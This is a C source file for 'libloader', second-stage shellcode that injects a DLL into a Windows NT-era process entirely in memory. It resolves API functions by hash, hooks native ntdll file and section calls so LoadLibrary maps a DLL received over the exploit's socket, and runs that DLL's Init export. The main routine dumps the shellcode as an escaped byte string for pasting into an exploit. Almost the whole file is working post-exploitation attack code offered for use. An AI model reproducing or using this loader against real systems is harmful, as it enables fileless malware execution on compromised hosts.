

/*
 * libloader -- In-Memory Remote Library Injection shellcode
 * Jarkko Turkulainen <jt[at]klake.org>
 *
 * Platforms: Windows NT4/2000/XP/2003
 *
 * Compile: cl /GS- /Os libloader.c /link /fixed /release
 *
 *
 * How to use:
 *
 * See main() for example. To make this work in real-world exploit, you
 * must manually hack the exploit code. For quick demonstration, run
 * against the demo server "srv.exe".
 *
 * NOTE: the loaded library MUST export a function named "Init" !!!
 * That is the actual code you must write to make this stuff useful :-)
 * See example.c to get the idea.
 *
 *
 * TODO:
 *
 * - Hide the DLL from PEB
 *
 *
 * Credits:
 *
 * - skape for ideas, nologin, Metasploit
 *
 *
 */




#include <winsock2.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "libloader.h"

#pragma comment(lib, "ws2_32.lib")

#pragma warning(disable: 4068)


/*
 * 2nd stage loader
 *
 * loader2_start is a bootstrapper for the actual shellcode. It loads all the
 * libraries and resolves function VMAs. All information is stored in structure
 * SHELLCODE_CTX which acts like import and data section for rest of the program.
 *
 */

void loader2_start() {
	SHELLCODE_CTX	ctx;
	char winsock[10];

	__asm {
		jmp  callback			; Jump to callback address

	startup:
		jmp  continue			; Continue execution

	callback:
		call startup			; Call startup

	continue:
		pop  ebx			; Absolute address of continue
		sub  ebx, 0x15			; Adjust the address to point to 
						; shellcode_start()
						; Note that this value is not
						; correct if the code above is modified
						; somehow (or if the compiler for some 
						; reason generates different code..)
		mov  ctx.offset, ebx		; Save offset
		mov  ctx.sd, edi		; Save the file descriptor
		jmp  resolve_vmas		; Skip general functions

#include "generic.c"

	resolve_vmas:
						; kernel32.dll routines

		call find_kernel32		; Find kernel32 base address
		mov  ebx, eax			; Save the handle in ebx
	
		push HASH_LoadLibraryA		; Push function hash
		push ebx			; Push base handle
		call find_function		; Find function
		add  esp, 8			; Fix stack
		mov  ctx.LoadLibrary, eax	; Save the VMA

		push HASH_GetProcAddress	; Here we go again..
		push ebx
		call find_function
		add  esp, 8
		mov  ctx.GetProcAddress, eax
		push HASH_ExitProcess
		push ebx
		call find_function
		add  esp, 8
		mov  ctx.ExitProcess, eax
		push HASH_VirtualAlloc
		push ebx
		call find_function
		add  esp, 8
		mov  ctx.VirtualAlloc, eax
		push HASH_VirtualFree
		push ebx
		call find_function
		add  esp, 8
		mov  ctx.VirtualFree, eax
		push HASH_VirtualQuery
		push ebx
		call find_function
		add  esp, 8
		mov  ctx.VirtualQuery, eax
		push HASH_VirtualProtect
		push ebx
		call find_function
		add  esp, 8
		mov  ctx.VirtualProtect, eax
		push HASH_FlushInstructionCache
		push ebx
		call find_function
		add  esp, 8
		mov  ctx.FlushInstructionCache, eax
		push HASH_WriteProcessMemory
		push ebx
		call find_function
		add  esp, 8
		mov  ctx.WriteProcessMemory, eax
						; ntdll.dll routines
		xor  eax, eax
		mov  al, 0x6c
		push eax			; Push "l\x00\x00\x00"
		push 0x6c64746e			; Push "ntdl"
		push esp                        ; Push address of "ntdll\x00\x00\x00"
		call ctx.LoadLibrary		; Get module handle
		mov  ebx, eax			; Save the handle in ebx

		push HASH_NtOpenSection		; Push function hash
		push ebx			; Push base handle
		call find_function		; Find function
		add  esp, 8			; Fix stack
		mov  ctx.NtOpenSection, eax	; Save function VMA

		
		push HASH_NtQueryAttributesFile	; Here we go again..
		push ebx
		call find_function
		add  esp, 8
		mov  ctx.NtQueryAttributesFile, eax
		push HASH_NtOpenFile
		push ebx
		call find_function
		add  esp, 8
		mov  ctx.NtOpenFile, eax
		push HASH_NtCreateSection
		push ebx
		call find_function
		add  esp, 8
		mov  ctx.NtCreateSection, eax
		push HASH_NtMapViewOfSection
		push ebx
		call find_function
		add  esp, 8
		mov  ctx.NtMapViewOfSection, eax
	}

	winsock[0] = 'w';
	winsock[1] = 's';
	winsock[2] = '2';
	winsock[3] = '_';
	winsock[4] = '3';
	winsock[5] = '2';
	winsock[6] = 0;

	ctx.LoadLibrary(winsock);

	__asm
	{
		mov  edx, eax

		push HASH_recv 
		push edx
		call find_function
		add  esp, 8
		mov  ctx.recv, eax
	}

	/* Now call the shellcode main function */

	loader2_main(&ctx);
}


/* 
 * This is where the context pointer is saved.
 * It is (almost) static offset from find_ctx so it is easily determined at run-time.
 * To be exact, the offset is dependent of compiler version, but the compiler knows
 * relative offset between these functions. Using that information with the absolute
 * address of find_ctx, the context pointer can be found. See find_ctx().
 *
 */
int __declspec(naked) ctx_data() {
	__asm {
		_emit 0xff
		_emit 0xff
		_emit 0xff
		_emit 0xff
	}

}

/*
 * find_ctx is used for finding the shellcode context in memory. It is 
 * mandatory step because the hook functions have no glue about the context 
 * (they are called from ntdll.dll)
 *		lea  eax, dword ptr find_ctx	; Calculate relative offset
		lea  edx, dword ptr ctx_data
		sub  eax, edx
 */
int __declspec(naked) find_ctx() {
	__asm {
		push ebp
		mov  ebp, esp
		call getaddress			; Get our address

	getaddress:
		pop  ecx			; Save address in ebx
		sub  ecx, 8			; Adjust to point to find_ctx
		mov  eax, offset find_ctx	; Calculate relative offset
		sub  eax, offset ctx_data
		sub  ecx, eax			; Adjust to point to ctx_data
		mov  eax, [ecx]			; Return contents
		pop  ebp
		ret
	}
}

/*
 * Find library name from given unicode string
 *
 */
int find_string(SHELLCODE_CTX *ctx, UNICODE_STRING *str) {
	int i, j;

	for (i = 0; i < str->Length; i++) {
		for (j = 0; j < ctx->liblen; j++) {
			if (str->Buffer[i + j] != ctx->libname[j])
				break;
		}

		/* Match */
		if (j == ctx->liblen) {
			return 0;
		}
	}
	return 1;
}


/* NtOpenSection hook */

NTSTATUS NTAPI m_NtOpenSection(
	PHANDLE SectionHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes) {

	SHELLCODE_CTX	*ctx;
	
	/* Find our context */
	ctx = (SHELLCODE_CTX *) find_ctx();

	if (!find_string(ctx, ObjectAttributes->ObjectName)) {
		*SectionHandle = (PHANDLE)ctx->mapped_address;
		return STATUS_SUCCESS;

	}
	return ctx->p_NtOpenSection(SectionHandle, DesiredAccess, 
		ObjectAttributes);
	
}


/* NtQueryAttributesFile hook */

NTSTATUS NTAPI m_NtQueryAttributesFile(
	POBJECT_ATTRIBUTES ObjectAttributes,
	PFILE_BASIC_INFORMATION FileAttributes) {

	SHELLCODE_CTX	*ctx;

	/* Find our context */
	ctx = (SHELLCODE_CTX *) find_ctx();

	if (!find_string(ctx, ObjectAttributes->ObjectName)) {

		/*
		 * struct PFILE_BASIC_INFORMATION must be actually filled
		 * with something sane, otherwise it might break something.
		 * The values are defined in libloader.h
		 *
		 */
		FileAttributes->CreationTime.LowPart = LOW_TIME_1;
		FileAttributes->CreationTime.HighPart = HIGH_TIME;
		FileAttributes->LastAccessTime.LowPart = LOW_TIME_2;
		FileAttributes->LastAccessTime.HighPart = HIGH_TIME;
		FileAttributes->LastWriteTime.LowPart = LOW_TIME_1;
		FileAttributes->LastWriteTime.HighPart = HIGH_TIME;
		FileAttributes->ChangeTime.LowPart = LOW_TIME_1;
		FileAttributes->ChangeTime.HighPart = HIGH_TIME;
		FileAttributes->FileAttributes = FILE_ATTRIBUTE_NORMAL; 
		return STATUS_SUCCESS;
	}
	
	return ctx->p_NtQueryAttributesFile(ObjectAttributes, FileAttributes);
	
}

/* NtOpenFile hook */

void NTAPI m_NtOpenFile(
	PHANDLE FileHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK IoStatusBlock,
	ULONG ShareAccess,
	ULONG OpenOptions) {
	
	SHELLCODE_CTX	*ctx;

	/* Find our context */
	ctx = (SHELLCODE_CTX *) find_ctx();

	if (!find_string(ctx, ObjectAttributes->ObjectName)) {
		*FileHandle = (PVOID)ctx->mapped_address;
		return;
	}

	ctx->p_NtOpenFile(
		FileHandle,
		DesiredAccess,
		ObjectAttributes,
		IoStatusBlock,
		ShareAccess,
		OpenOptions);
	return;
	
}

/* NtCreateSection hook */

NTSTATUS NTAPI m_NtCreateSection(
	PHANDLE SectionHandle, 
	ULONG DesiredAccess, 
	POBJECT_ATTRIBUTES ObjectAttributes,
	PLARGE_INTEGER MaximumSize,
	ULONG PageAttributes,
	ULONG SectionAttributes,
	HANDLE FileHandle) {

	SHELLCODE_CTX	*ctx;

	/* Find our context */
	ctx = (SHELLCODE_CTX *)find_ctx();

	if (FileHandle == (HANDLE)ctx->mapped_address) {
		*SectionHandle = (PVOID)ctx->mapped_address;
		return STATUS_SUCCESS;	
	}

	return ctx->p_NtCreateSection(
		SectionHandle, 
		DesiredAccess, 
		ObjectAttributes,
		MaximumSize,
		PageAttributes,
		SectionAttributes,
		FileHandle);

}


/* NtMapViewOfSection hook */

NTSTATUS NTAPI m_NtMapViewOfSection(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG ZeroBits,
	ULONG CommitSize,
	PLARGE_INTEGER SectionOffset,
	PULONG ViewSize,
	SECTION_INHERIT InheritDisposition,
	ULONG AllocationType,
	ULONG Protect) {
	
	SHELLCODE_CTX	*ctx;

	/* Find our context */
	ctx = (SHELLCODE_CTX *)find_ctx();

	if (SectionHandle == (HANDLE)ctx->mapped_address) {
		*BaseAddress = (PVOID)ctx->mapped_address;

		/* We assume that the image must be relocated */
		return STATUS_IMAGE_NOT_AT_BASE;
		
	}

	return ctx->p_NtMapViewOfSection(
		SectionHandle,
		ProcessHandle,
		BaseAddress,
		ZeroBits,
		CommitSize,
		SectionOffset,
		ViewSize,
		InheritDisposition,
		AllocationType,
		Protect);
}


/* Patch given function */

void patch_function(SHELLCODE_CTX *ctx, DWORD address, unsigned char *stub, 
		unsigned char *hook) {
	DWORD				protect;
	ULONG 				bytes, written;
	MEMORY_BASIC_INFORMATION	mbi_thunk;
	

	/*
	 * Most native NT functions begin with stub like this:
	 *
	 * 00000000  B82B000000        mov eax,0x2b         ; syscall
	 * 00000005  8D542404          lea edx,[esp+0x4]    ; arguments
	 * 00000009  CD2E              int 0x2e             ; interrupt
	 *
	 * In offset 0, the actual system call is saved in eax. Syscall
	 * is 32 bit number (!) so we can assume 5 bytes of preamble size
	 * for each function.. If there's need to hook other functions,
	 * a complete disassembler is needed for preamble size counting.
	 *
	 */
	bytes = 5;

	/* Create the stub */
	ctx->WriteProcessMemory((HANDLE)-1, stub, (char *)address, 
		bytes, &written);
	*(PBYTE)(stub + bytes) = 0xE9;
	*(DWORD *)(stub + bytes + 1) = (DWORD)address - ((DWORD)stub + 5);


	/* Patch original function */

	/* Fix protection */
	ctx->VirtualQuery((char *)address, &mbi_thunk, 
		sizeof(MEMORY_BASIC_INFORMATION));
	ctx->VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize, 
		PAGE_EXECUTE_READWRITE, &mbi_thunk.Protect);
		
	/* Insert jump */
	*(PBYTE)address = 0xE9;
	*(DWORD *)(address + 1) = (DWORD)hook - ((DWORD)address + 5);


	/* Restore protection */
	ctx->VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize, 
		mbi_thunk.Protect, &protect);
	ctx->FlushInstructionCache((HANDLE)-1, mbi_thunk.BaseAddress,
		mbi_thunk.RegionSize);

}

/* Install hooks, fix addresses */

void install_hooks(SHELLCODE_CTX *ctx) {

	/* NtMapViewOfSection */

	/* Patch */
	patch_function(ctx, ctx->NtMapViewOfSection, 
		ctx->s_NtMapViewOfSection, 
		(unsigned char *)((DWORD)m_NtMapViewOfSection -
			(DWORD)loader2_start) + ctx->offset);

	/* Copy pointer */
	ctx->p_NtMapViewOfSection = 
		(f_NtMapViewOfSection)ctx->s_NtMapViewOfSection;

	/* NtQueryAttributesFile */
	patch_function(ctx, ctx->NtQueryAttributesFile,
		 ctx->s_NtQueryAttributesFile, 
		(unsigned char *)((DWORD)m_NtQueryAttributesFile - 
			(DWORD)loader2_start) + ctx->offset);
	ctx->p_NtQueryAttributesFile = 
		(f_NtQueryAttributesFile)ctx->s_NtQueryAttributesFile;

	/* NtOpenFile */
	patch_function(ctx, ctx->NtOpenFile, ctx->s_NtOpenFile, 
		(unsigned char *)((DWORD)m_NtOpenFile - 
			(DWORD)loader2_start) + ctx->offset);
	ctx->p_NtOpenFile = (f_NtOpenFile)ctx->s_NtOpenFile;

	/* NtCreateSection */
	patch_function(ctx, ctx->NtCreateSection, ctx->s_NtCreateSection, 
		(unsigned char *)((DWORD)m_NtCreateSection - 
			(DWORD)loader2_start) + ctx->offset);
	ctx->p_NtCreateSection = (f_NtCreateSection)ctx->s_NtCreateSection;
	
	
	/* NtOpenSection */
	patch_function(ctx, ctx->NtOpenSection, ctx->s_NtOpenSection, 
		(unsigned char *)((DWORD)m_NtOpenSection - 
			(DWORD)loader2_start) + ctx->offset);
	ctx->p_NtOpenSection = (f_NtOpenSection)ctx->s_NtOpenSection;
	
}

/* Restore given function */

void restore_function(SHELLCODE_CTX *ctx, DWORD address, unsigned char *stub) {
	DWORD				protect;
	ULONG 				bytes, written;
	MEMORY_BASIC_INFORMATION	mbi_thunk;

	bytes = 5;

	/* Patch original function */

	/* Fix protection */
	ctx->VirtualQuery((char *)address, &mbi_thunk, 
		sizeof(MEMORY_BASIC_INFORMATION));
	ctx->VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize, 
		PAGE_EXECUTE_READWRITE, &mbi_thunk.Protect);
		
	/* Copy bytes back to function */
	ctx->WriteProcessMemory((HANDLE)-1, (char *)address, stub,
		bytes, &written);

	/* Restore protection */
	ctx->VirtualProtect(mbi_thunk.BaseAddress, mbi_thunk.RegionSize, 
		mbi_thunk.Protect, &protect);
	ctx->FlushInstructionCache((HANDLE)-1, mbi_thunk.BaseAddress,
		mbi_thunk.RegionSize);

}

/* Remove hooks */

void remove_hooks(SHELLCODE_CTX *ctx) {

	/* NtMapViewOfSection */
	restore_function(ctx, ctx->NtMapViewOfSection, 
		ctx->s_NtMapViewOfSection);
		
	/* NtQueryAttributesFile */
	restore_function(ctx, ctx->NtQueryAttributesFile,
		 ctx->s_NtQueryAttributesFile);

	/* NtOpenFile */
	restore_function(ctx, ctx->NtOpenFile, ctx->s_NtOpenFile);

	/* NtCreateSection */
	restore_function(ctx, ctx->NtCreateSection, ctx->s_NtCreateSection);
	
	
	/* NtOpenSection */
	restore_function(ctx, ctx->NtOpenSection, ctx->s_NtOpenSection);
	

}

/* Map file in memory as section */

void map_file(SHELLCODE_CTX *ctx) {
	PIMAGE_NT_HEADERS 	nt;
	PIMAGE_DOS_HEADER 	dos;
	PIMAGE_SECTION_HEADER	sect;
	int			i;
	
	dos = (PIMAGE_DOS_HEADER)ctx->file_address;
	nt = (PIMAGE_NT_HEADERS)(ctx->file_address + dos->e_lfanew);

	/* 
	 * Allocate space for the mapping
	 * First, try to map the file at ImageBase
	 *
	 */
	ctx->mapped_address = (DWORD)ctx->VirtualAlloc((PVOID)nt->OptionalHeader.ImageBase,
		nt->OptionalHeader.SizeOfImage,
		MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	 

	/* No success, let the system decide..  */
	if (ctx->mapped_address == 0) {
		ctx->mapped_address = (DWORD)ctx->VirtualAlloc((PVOID)NULL,
			nt->OptionalHeader.SizeOfImage,
			MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	}

	/* Write headers */
	ctx->WriteProcessMemory((HANDLE)-1, (LPVOID)ctx->mapped_address, 
		(LPVOID)ctx->file_address, nt->OptionalHeader.SizeOfHeaders, 0);

	/* Write sections */
	sect = IMAGE_FIRST_SECTION(nt);
	for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
		ctx->WriteProcessMemory((HANDLE)-1,
			(PCHAR)ctx->mapped_address + sect[i].VirtualAddress,
			(PCHAR)ctx->file_address + sect[i].PointerToRawData,
			sect[i].SizeOfRawData, 0);
	}

}


/* 
 * loader2_main - shellcode main function
 *
 * Yes - written in C. Why?
 *
 * - It is 2nd stage, there is not need for optimizing
 * - Writing complex programs in pure assembly takes time
 * - C shellcode is extremely cool
 * - I wanted to find out how it's done
 * - Oh, I almost forgot, it's cool
 *
 */

int loader2_main(SHELLCODE_CTX *ctx) {
	SHELLCODE_CTX *saveCtx;
	DWORD		length, base, function, old;
	char		name[12];
	int		i, bytes, read, left;

	// Our context needs to be executable since we store original functions preambles
	// inline (which are executed).
	ctx->VirtualProtect(
		ctx,
		sizeof(SHELLCODE_CTX),
		PAGE_EXECUTE_READWRITE,
		&old);

	/* dll entry point */
	name[0] = 'I';
	name[1] = 'n';
	name[2] = 'i';
	name[3] = 't';
	name[4] = '\0';

	/* Read the first 4 bytes for file length */
	bytes = ctx->recv(ctx->sd, (char *)&length, 4, 0);
	if (bytes <= 0) {
		ctx->ExitProcess(1);
	}

	/* Allocate space for data */
	ctx->file_address = (DWORD)ctx->VirtualAlloc(NULL, length, 
		MEM_COMMIT, PAGE_READWRITE);
	if (ctx->file_address == 0) {
		ctx->ExitProcess(1);
	}

	/* Read file */
	for (bytes = 0, read = 0, left = length; left > 0; 
	     left -= bytes, read += bytes) {
		bytes = ctx->recv(ctx->sd, (char *)(ctx->file_address + read), 
			left, 0);
		if (bytes < 0) {
			break;
		}
	}

	/* Set the library name */
	for (i = 0; *(char *)(ctx->file_address + i); i++)
		ctx->libname[i] = *(char *)(ctx->file_address + i);
	ctx->libname[i] = 0;
	ctx->liblen     = i;

	/* Update the file address offset */
	ctx->file_address += i + 1;

	map_file(ctx);

	/* Write context pointer */
	*(DWORD *)(((DWORD)ctx_data - (DWORD)loader2_start) + ctx->offset) = 
		*(DWORD *)&ctx;

	install_hooks(ctx);

	if ((base = ctx->LoadLibrary(ctx->libname)) == 0) {
		
		/* Something is terribly wrong.. */
		ctx->ExitProcess(1);
	}

	remove_hooks(ctx);

	/* Call entry point, if it exists */
	if ((function = (DWORD)ctx->GetProcAddress((HMODULE)base, 
			(LPCTSTR)name)) != 0) {

		((int(*)()) (function))(ctx->sd);
	} 

	ctx->VirtualFree((LPVOID)((char *)ctx->file_address - ctx->liblen - 1), 
	      0, MEM_RELEASE);

	ctx->ExitProcess(0);

	ctx = NULL;

	/* Just to keep compiler happy */
	return(0);

}



/* Just a stub for counting the shellcode size */

int __declspec(naked) loader2_end() {
	__asm ret

}



/* 
 * Simple program for demonstration with "srv.exe"
 *
 * Example: libloader 10.0.0.1 1111 example.dll
 *
 */

int main(int argc, char **argv) {
	int 			sd, c, i;
	char			*buf, databuf[1024];
	struct hostent 		*hp;
	struct sockaddr_in 	adr, local;
	struct stat             sstat;
	FILE			*fp;
	WSADATA 		wsa_data;
	unsigned char 		*start1, *end1, *start2, *end2;
	unsigned long		length1, length2;


	start2 = (unsigned char *)loader2_start;
	end2   = (unsigned char *)loader2_end;
	length2 = end2 - start2;

	/* 
	 * XXXXXXXXXXXX Insert your exploit code here... XXXXXXXXXXX
	 *
	 * If this were a real world exploit, the actual exploit magic
	 * should be done at this point. As a proof-of-concept, we just
	 * send the 1st loader to host which jumps to code and executes
	 * it (assuming that there's the example server "srv.exe").
	 *
	 */


	fprintf(stderr, "total size is %lu\n", length2);
	printf("\"");
	for (i = 0; i < length2; i++)
	{
		printf("\\x%02x", start2[i] & 0xff);

		if (i > 0 && i % 20 == 0)
			printf("\" +\n\"");
	}
	printf("\"\n");

	exit(0);
}

